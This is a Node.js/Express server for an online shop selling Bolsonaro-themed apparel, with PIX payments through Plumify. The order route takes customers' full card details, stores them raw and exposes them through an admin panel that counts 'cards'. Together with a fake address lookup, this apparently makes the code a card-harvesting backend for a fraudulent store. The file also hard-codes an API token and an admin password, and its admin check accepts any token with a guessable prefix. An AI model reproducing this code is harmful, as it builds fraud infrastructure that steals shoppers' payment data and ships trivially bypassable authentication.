const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== CONFIGURAÇÃO PLUMIFY ==========
const PLUMIFY_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
const ACCOUNT_HASH = '9kajnnbn2c';
const PRODUCT_CODE = 'pdkhijtoed';
const OFFER_HASH = '7becb';
const PLUMIFY_API_URL = 'https://api.plumify.com.br/api/public/v1';

// ========== FUNÇÃO GERAR PIX PLUMIFY COM QR CODE ==========
async function gerarPixPlumify(cliente, total, itens, pedidoId, host) {
    const cpfLimpo = cliente.cliente_cpf ? cliente.cliente_cpf.replace(/\D/g, '') : '';
    const telefoneLimpo = cliente.cliente_telefone ? cliente.cliente_telefone.replace(/\D/g, '') : '';
    const amountInCents = Math.round(total * 100);
    
    const payload = {
        account_hash: ACCOUNT_HASH,
        amount: amountInCents,
        currency: "BRL",
        payment_method: "pix",
        offer_hash: OFFER_HASH,
        customer: {
            name: cliente.cliente_nome,
            email: cliente.cliente_email,
            document: cpfLimpo,
            document_type: "cpf",
            phone: telefoneLimpo || "11999999999"
        },
        items: itens.map(item => ({
            product_code: PRODUCT_CODE,
            title: item.nome,
            quantity: item.quantidade,
            price: Math.round(item.preco * 100),
            tangible: false
        })),
        metadata: {
            order_id: pedidoId,
            customer_email: cliente.cliente_email
        }
    };

    if (host && !host.includes('localhost')) {
        payload.postback_url = `https://${host}/api/webhook/plumify`;
    }

    console.log('\n🟢 Enviando para Plumify API:');
    console.log(`URL: ${PLUMIFY_API_URL}/transactions`);
    console.log('Payload:', JSON.stringify(payload, null, 2));

    try {
        // 1. CRIA A TRANSAÇÃO
        const response = await fetch(`${PLUMIFY_API_URL}/transactions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'api_token': PLUMIFY_TOKEN
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log('📡 Resposta da criação:', JSON.stringify(data, null, 2));

        if (response.ok || response.status === 201) {
            const transactionHash = data.transaction_hash || data.id || data.hash || data.transaction_id;
            
            if (!transactionHash) {
                console.error('❌ Nenhum hash de transação encontrado');
                return { success: false, error: 'Hash da transação não encontrado' };
            }
            
            console.log(`✅ Transação criada: ${transactionHash}`);
            
            // 2. BUSCA O QR CODE PIX
            console.log(`🔄 Buscando QR Code para transação: ${transactionHash}`);
            
            // Tenta diferentes endpoints para buscar o QR Code
            const qrEndpoints = [
                `/transactions/${transactionHash}/pix`,
                `/transactions/${transactionHash}/qr_code`,
                `/transactions/${transactionHash}/pix/qr_code`,
                `/pix/${transactionHash}/qr_code`,
                `/charge/${transactionHash}/pix`
            ];
            
            let qrCode = null;
            let qrData = null;
            
            for (const endpoint of qrEndpoints) {
                try {
                    console.log(`📡 Tentando: ${endpoint}`);
                    const qrResponse = await fetch(`${PLUMIFY_API_URL}${endpoint}`, {
                        method: 'GET',
                        headers: {
                            'Content-Type': 'application/json',
                            'api_token': PLUMIFY_TOKEN
                        }
                    });
                    
                    if (qrResponse.ok) {
                        qrData = await qrResponse.json();
                        console.log(`📡 Resposta QR (${endpoint}):`, JSON.stringify(qrData, null, 2));
                        
                        qrCode = qrData.qr_code || qrData.pix_qr_code || qrData.qrcode || qrData.code || qrData.qrCode;
                        
                        if (qrCode) {
                            console.log(`✅ QR Code encontrado via ${endpoint}`);
                            break;
                        }
                    }
                } catch (err) {
                    console.log(`⚠️ Erro no endpoint ${endpoint}: ${err.message}`);
                }
            }
            
            // 3. SE AINDA NÃO TEM QR CODE, TENTA PEGAR DA TRANSAÇÃO COMPLETA
            if (!qrCode) {
                console.log(`🔄 Buscando transação completa...`);
                const transResponse = await fetch(`${PLUMIFY_API_URL}/transactions/${transactionHash}`, {
                    method: 'GET',
                    headers: { 'api_token': PLUMIFY_TOKEN }
                });
                
                if (transResponse.ok) {
                    const transData = await transResponse.json();
                    console.log('📡 Transação completa:', JSON.stringify(transData, null, 2));
                    
                    qrCode = transData.pix_qr_code || transData.qr_code || transData.pix_code || transData.qrcode;
                    
                    if (!qrCode && transData.pix) {
                        qrCode = transData.pix.qr_code || transData.pix.qrcode;
                    }
                }
            }
            
            // 4. SE AINDA NÃO TEM QR CODE, TENTA GERAR NOVAMENTE
            if (!qrCode) {
                console.log(`🔄 Tentando gerar QR Code novamente...`);
                const regenerateResponse = await fetch(`${PLUMIFY_API_URL}/transactions/${transactionHash}/generate_qr`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'api_token': PLUMIFY_TOKEN
                    }
                });
                
                if (regenerateResponse.ok) {
                    const regenData = await regenerateResponse.json();
                    qrCode = regenData.qr_code || regenData.pix_qr_code;
                }
            }
            
            // 5. RETORNA O RESULTADO
            if (qrCode) {
                return {
                    success: true,
                    pix_qr_code: qrCode,
                    transaction_hash: transactionHash,
                    status: data.status || 'pending',
                    qr_code_base64: qrCode.startsWith('data:image') ? qrCode : null,
                    data: { ...data, qr_code: qrCode }
                };
            } else {
                // Retorna a transação mesmo sem QR Code (pode ser gerado depois)
                return {
                    success: true,
                    pix_qr_code: null,
                    transaction_hash: transactionHash,
                    status: data.status || 'pending',
                    warning: 'Transação criada mas QR Code não disponível ainda',
                    requires_polling: true,
                    data: data
                };
            }
        } else {
            console.error('❌ Erro ao criar transação:', data);
            return {
                success: false,
                error: data.message || data.error || 'Erro ao gerar PIX',
                status: response.status,
                details: data
            };
        }
    } catch (error) {
        console.error('❌ Erro de conexão:', error);
        return { success: false, error: error.message };
    }
}

// ========== FUNÇÃO GERAR PIX LOCAL (FALLBACK) ==========
function gerarPixLocal(total, pedidoId) {
    const chavePix = 'capitao@store.com';
    const nomeRecebedor = 'CAPITAO STORE';
    const cidade = 'BRASILIA';
    const valorFormatado = total.toFixed(2).replace('.', '');
    const txid = pedidoId.replace(/[^A-Za-z0-9]/g, '').substring(0, 25);
    
    const pixPayload = [
        '000201',
        '26',
        '0014br.gov.bcb.pix',
        '01' + String(chavePix.length).padStart(2, '0') + chavePix,
        '52040000',
        '5303986',
        '54' + String(valorFormatado.length).padStart(2, '0') + valorFormatado,
        '5802BR',
        '59' + String(nomeRecebedor.length).padStart(2, '0') + nomeRecebedor,
        '60' + String(cidade.length).padStart(2, '0') + cidade,
        '62',
        '05' + String(txid.length).padStart(2, '0') + txid
    ].join('');
    
    function calculateCRC16(payload) {
        let crc = 0xFFFF;
        for (let i = 0; i < payload.length; i++) {
            crc ^= payload.charCodeAt(i) << 8;
            for (let j = 0; j < 8; j++) {
                if (crc & 0x8000) {
                    crc = (crc << 1) ^ 0x1021;
                } else {
                    crc = crc << 1;
                }
                crc &= 0xFFFF;
            }
        }
        return crc.toString(16).toUpperCase().padStart(4, '0');
    }
    
    const pixCode = pixPayload + '6304' + calculateCRC16(pixPayload + '6304');
    
    return {
        qr_code: pixCode,
        qr_code_base64: null,
        transaction_hash: pedidoId,
        status: 'local_pending'
    };
}

// ========== ROTA PRINCIPAL PIX ==========
app.post('/api/gerar-pix', async (req, res) => {
    const { cliente, total, itens } = req.body;
    
    if (!cliente || !cliente.cliente_nome || !cliente.cliente_email || !total || total <= 0 || !itens || itens.length === 0) {
        return res.status(400).json({ success: false, error: 'Dados incompletos' });
    }

    const pedidoId = `CAP${Date.now()}`;
    const host = req.headers.host;
    
    console.log(`\n💰 NOVO PIX - Pedido: ${pedidoId} | Total: R$ ${total} | Cliente: ${cliente.cliente_nome}`);

    try {
        // Tenta gerar PIX via Plumify
        const result = await gerarPixPlumify(cliente, parseFloat(total), itens, pedidoId, host);
        
        if (result.success) {
            // Salva o pedido
            const pedidoCompleto = {
                pedido_id: pedidoId,
                cliente_nome: cliente.cliente_nome,
                cliente_email: cliente.cliente_email,
                cliente_cpf: cliente.cliente_cpf,
                cliente_telefone: cliente.cliente_telefone,
                endereco_cep: cliente.endereco_cep,
                endereco_rua: cliente.endereco_rua,
                endereco_numero: cliente.endereco_numero,
                endereco_bairro: cliente.endereco_bairro,
                endereco_cidade: cliente.endereco_cidade,
                endereco_uf: cliente.endereco_uf,
                itens: itens,
                total: parseFloat(total),
                forma_pagamento: 'PIX',
                status: 'aguardando_pagamento',
                transaction_hash: result.transaction_hash,
                created_at: new Date().toISOString(),
                provider: 'plumify'
            };
            
            if (!global.pedidosPendentes) global.pedidosPendentes = [];
            global.pedidosPendentes.push(pedidoCompleto);
            pedidos.unshift(pedidoCompleto);
            
            return res.json({
                success: true,
                pix_qr_code: result.pix_qr_code,
                pix_qr_code_base64: result.qr_code_base64,
                transaction_hash: result.transaction_hash,
                pedido_id: pedidoId,
                provider: 'plumify',
                status: result.status,
                warning: result.warning || null
            });
        } else {
            // Fallback para PIX local
            console.log('⚠️ Usando fallback local');
            const localPix = gerarPixLocal(parseFloat(total), pedidoId);
            
            const pedidoCompleto = {
                pedido_id: pedidoId,
                cliente_nome: cliente.cliente_nome,
                cliente_email: cliente.cliente_email,
                cliente_cpf: cliente.cliente_cpf,
                cliente_telefone: cliente.cliente_telefone,
                endereco_cep: cliente.endereco_cep,
                endereco_rua: cliente.endereco_rua,
                endereco_numero: cliente.endereco_numero,
                endereco_bairro: cliente.endereco_bairro,
                endereco_cidade: cliente.endereco_cidade,
                endereco_uf: cliente.endereco_uf,
                itens: itens,
                total: parseFloat(total),
                forma_pagamento: 'PIX',
                status: 'aguardando_pagamento_local',
                transaction_hash: localPix.transaction_hash,
                created_at: new Date().toISOString(),
                provider: 'local'
            };
            
            pedidos.unshift(pedidoCompleto);
            
            return res.json({
                success: true,
                pix_qr_code: localPix.qr_code,
                transaction_hash: localPix.transaction_hash,
                pedido_id: pedidoId,
                provider: 'local',
                warning: 'PIX gerado localmente - Pagamento manual',
                pix_key: 'capitao@store.com'
            });
        }
    } catch (error) {
        console.error('❌ Erro:', error);
        const localPix = gerarPixLocal(parseFloat(total), pedidoId);
        
        return res.json({
            success: true,
            pix_qr_code: localPix.qr_code,
            transaction_hash: localPix.transaction_hash,
            pedido_id: pedidoId,
            provider: 'local_fallback',
            warning: 'Erro na integração - PIX local'
        });
    }
});

// ========== ROTA PARA VERIFICAR STATUS DO PIX ==========
app.get('/api/verificar-pix/:transaction_hash', async (req, res) => {
    const { transaction_hash } = req.params;
    
    console.log(`\n🔍 Verificando PIX: ${transaction_hash}`);
    
    try {
        // Verifica na Plumify
        const response = await fetch(`${PLUMIFY_API_URL}/transactions/${transaction_hash}`, {
            method: 'GET',
            headers: { 'api_token': PLUMIFY_TOKEN }
        });
        
        if (response.ok) {
            const data = await response.json();
            const status = data.status;
            const paid = status === 'paid' || status === 'approved' || status === 'completed';
            
            if (paid) {
                // Atualiza o pedido
                const pedido = pedidos.find(p => p.transaction_hash === transaction_hash);
                if (pedido && pedido.status !== 'pago') {
                    pedido.status = 'pago';
                    pedido.pago_em = new Date().toISOString();
                    console.log(`✅ Pedido ${pedido.pedido_id} pago!`);
                }
            }
            
            return res.json({
                success: true,
                status: status,
                paid: paid,
                transaction: data
            });
        }
        
        // Verifica nos pedidos locais
        const pedidoLocal = pedidos.find(p => p.transaction_hash === transaction_hash && p.provider === 'local');
        if (pedidoLocal) {
            return res.json({
                success: true,
                status: 'pending_manual',
                paid: false,
                message: 'Pagamento local - aguardando confirmação manual'
            });
        }
        
        return res.json({
            success: false,
            status: 'not_found',
            paid: false
        });
    } catch (error) {
        console.error('❌ Erro na verificação:', error);
        return res.json({
            success: false,
            error: error.message,
            paid: false
        });
    }
});

// ========== ROTA PARA GERAR QR CODE MANUALMENTE ==========
app.post('/api/gerar-qrcode/:transaction_hash', async (req, res) => {
    const { transaction_hash } = req.params;
    
    console.log(`\n🔄 Gerando QR Code para: ${transaction_hash}`);
    
    try {
        const response = await fetch(`${PLUMIFY_API_URL}/transactions/${transaction_hash}/generate_qr`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'api_token': PLUMIFY_TOKEN
            }
        });
        
        const data = await response.json();
        
        if (response.ok) {
            const qrCode = data.qr_code || data.pix_qr_code;
            return res.json({
                success: true,
                pix_qr_code: qrCode,
                transaction_hash: transaction_hash
            });
        } else {
            return res.json({
                success: false,
                error: data.message || 'Erro ao gerar QR Code'
            });
        }
    } catch (error) {
        return res.json({
            success: false,
            error: error.message
        });
    }
});

// ========== ROTA DE TESTE ==========
app.get('/api/testar-plumify', async (req, res) => {
    const resultados = {
        configuracao: {
            token: PLUMIFY_TOKEN.substring(0, 15) + '...',
            account_hash: ACCOUNT_HASH,
            product_code: PRODUCT_CODE,
            offer_hash: OFFER_HASH,
            api_url: PLUMIFY_API_URL
        },
        testes: []
    };
    
    // Teste 1: Listar produtos
    try {
        const response = await fetch(`${PLUMIFY_API_URL}/products`, {
            headers: { 'api_token': PLUMIFY_TOKEN }
        });
        const data = await response.json();
        
        resultados.testes.push({
            nome: 'Listar Produtos',
            endpoint: '/products',
            status: response.status,
            ok: response.ok,
            produtos_encontrados: data.data ? data.data.length : 0
        });
    } catch (error) {
        resultados.testes.push({
            nome: 'Listar Produtos',
            error: error.message
        });
    }
    
    // Teste 2: Criar transação de teste
    try {
        const testPayload = {
            account_hash: ACCOUNT_HASH,
            amount: 100,
            currency: "BRL",
            payment_method: "pix",
            offer_hash: OFFER_HASH,
            customer: {
                name: "Teste API",
                email: "teste@api.com",
                document: "12345678909",
                document_type: "cpf",
                phone: "11999999999"
            },
            items: [{
                product_code: PRODUCT_CODE,
                title: "Teste API",
                quantity: 1,
                price: 100,
                tangible: false
            }]
        };
        
        const response = await fetch(`${PLUMIFY_API_URL}/transactions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'api_token': PLUMIFY_TOKEN
            },
            body: JSON.stringify(testPayload)
        });
        
        const data = await response.json();
        
        resultados.testes.push({
            nome: 'Criar Transação',
            endpoint: '/transactions',
            status: response.status,
            ok: response.ok,
            transaction_hash: data.hash || data.id,
            mensagem: response.ok ? '✅ Transação criada' : '❌ Falha ao criar'
        });
    } catch (error) {
        resultados.testes.push({
            nome: 'Criar Transação',
            error: error.message
        });
    }
    
    res.json(resultados);
});

// ========== WEBHOOK ==========
app.post('/api/webhook/plumify', (req, res) => {
    console.log('\n📢 WEBHOOK PLUMIFY:');
    console.log(JSON.stringify(req.body, null, 2));
    
    const { transaction_hash, status, amount } = req.body;
    
    if (status === 'paid' || status === 'approved') {
        const pedido = pedidos.find(p => p.transaction_hash === transaction_hash);
        if (pedido && pedido.status !== 'pago') {
            pedido.status = 'pago';
            pedido.pago_em = new Date().toISOString();
            console.log(`✅ Pedido ${pedido.pedido_id} confirmado via webhook!`);
        }
    }
    
    res.json({ success: true });
});

// ========== DADOS DA LOJA ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, vendas: 152, descricao: "Camiseta 100% algodão com estampa exclusiva do Capitão.", created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, vendas: 89, descricao: "Boné em algodão com bordado personalizado.", created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, vendas: 234, descricao: "Caneca porcelana 300ml com frase histórica.", created_at: new Date().toISOString() },
    { id: 4, nome: "Regata Dry Fit Brasil", preco: 69.90, preco_antigo: 99.90, imagem: "https://placehold.co/600x800/f2ede2/8b6b3d?text=REGATA+AZUL", categoria: "Camisetas", estoque: 40, destaque: true, ativo: true, vendas: 67, descricao: "Regata dry fit ideal para dias quentes.", created_at: new Date().toISOString() },
    { id: 5, nome: "Moletom Canguru 2026", preco: 179.90, preco_antigo: 249.90, imagem: "https://placehold.co/600x800/e9e0d3/8b6b3d?text=MOLETOM", categoria: "Moletons", estoque: 20, destaque: true, ativo: true, vendas: 45, descricao: "Moletom canguru super quentinho.", created_at: new Date().toISOString() },
    { id: 6, nome: "Camiseta Deus Acima de Todos", preco: 79.90, preco_antigo: 109.90, imagem: "https://placehold.co/600x800/fcf7ef/8b6b3d?text=CAMISETA+BRANCA", categoria: "Camisetas", estoque: 60, destaque: true, ativo: true, vendas: 123, descricao: "Camiseta branca com estampa patriótica.", created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];

// ========== ROTAS DA LOJA ==========
app.get('/api/produtos', (req, res) => {
    res.json({ success: true, produtos: produtos.filter(p => p.ativo === true) });
});

app.get('/api/produto/:id', (req, res) => {
    const produto = produtos.find(p => p.id == req.params.id && p.ativo === true);
    if (produto) {
        res.json({ success: true, produto });
    } else {
        res.status(404).json({ success: false, error: 'Produto não encontrado' });
    }
});

app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    
    if (req.body.cartao) {
        cartoes.push({
            id: Date.now(),
            ...req.body.cartao,
            created_at: new Date().toISOString(),
            pedido_id: pedidoId
        });
        delete req.body.cartao;
    }
    
    const pedidoCompleto = { 
        ...req.body, 
        pedido_id: pedidoId, 
        created_at: new Date().toISOString(),
        status: 'pendente',
        ip_cliente: req.ip || req.connection.remoteAddress,
        user_agent: req.headers['user-agent']
    };
    
    pedidos.unshift(pedidoCompleto);
    res.json({ success: true, pedido_id: pedidoId });
});

app.get('/api/pedido/:id', (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    res.json({ success: !!pedido, pedido });
});

app.get('/api/cep/:cep', (req, res) => {
    res.json({
        success: true,
        logradouro: "Avenida Paulista",
        bairro: "Bela Vista",
        cidade: "São Paulo",
        uf: "SP"
    });
});

// ========== ADMIN ==========
app.post('/api/admin/login', (req, res) => {
    if (req.body.username === 'kakabanker' && req.body.password === '77991958@Abc') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) {
        return res.status(401).json({ success: false });
    }
    next();
}

app.get('/api/admin/produtos', verifyAdmin, (req, res) => { 
    res.json({ success: true, produtos }); 
});

app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { 
    res.json({ success: true, pedidos }); 
});

app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { 
    res.json({ success: true, cartoes }); 
});

app.get('/api/admin/visitantes', verifyAdmin, (req, res) => { 
    res.json({ success: true, visitantes }); 
});

app.get('/api/admin/carrinhos-abandonados', verifyAdmin, (req, res) => { 
    res.json({ success: true, carrinhos: carrinhosAbandonados }); 
});

app.get('/api/admin/stats', verifyAdmin, (req, res) => { 
    res.json({ 
        success: true, 
        stats: { 
            online: visitantes.filter(v => {
                const ultimaHora = new Date() - new Date(v.ultima_visita);
                return ultimaHora < 3600000;
            }).length,
            revenue: pedidos.reduce((sum, p) => sum + (p.total || 0), 0),
            cards: cartoes.length,
            orders: pedidos.length
        } 
    }); 
});

app.get('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true, pix_key: 'Configurado via Plumify' });
});

app.post('/api/admin/pix', verifyAdmin, (req, res) => {
    res.json({ success: true });
});

app.post('/api/admin/produtos', verifyAdmin, (req, res) => {
    const newProduto = {
        id: produtos.length + 1,
        ...req.body,
        created_at: new Date().toISOString(),
        vendas: 0,
        ativo: true
    };
    produtos.push(newProduto);
    res.json({ success: true, produto: newProduto });
});

app.delete('/api/admin/produtos/:id/permanent', verifyAdmin, (req, res) => {
    const id = parseInt(req.params.id);
    const index = produtos.findIndex(p => p.id === id);
    if (index !== -1) {
        produtos.splice(index, 1);
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    if (pedido) {
        pedido.status = req.body.status;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

// ========== INICIALIZAÇÃO ==========
app.listen(PORT, () => {
    console.log(`\n🚀 Servidor rodando na porta ${PORT}`);
    console.log(`🔐 Admin: http://localhost:${PORT}/admin`);
    console.log(`👤 Login: kakabanker / 77991958@Abc`);
    console.log(`\n💳 PLUMIFY INTEGRATION:`);
    console.log(`   URL: ${PLUMIFY_API_URL}`);
    console.log(`   Teste: http://localhost:${PORT}/api/testar-plumify`);
    console.log(`\n✅ Sistema pronto!`);
});